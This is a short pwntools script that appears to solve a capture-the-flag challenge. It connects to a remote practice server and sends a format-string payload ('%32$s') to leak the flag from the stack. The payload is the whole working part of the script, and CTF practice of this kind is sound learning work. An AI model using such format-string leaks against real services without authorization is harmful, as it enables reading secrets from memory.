from pwn import *
from LibcSearcher import *
context(os='linux',arch='i386',log_level='debug')
binary = './judgement_mna_2016'
# io = process(binary)
io = remote('node4.buuoj.cn',29453)
elf = ELF(binary)

payload = b'%32$s'
io.sendafter(b'Flag judgment system\nInput flag >> ', payload)

io.interactive()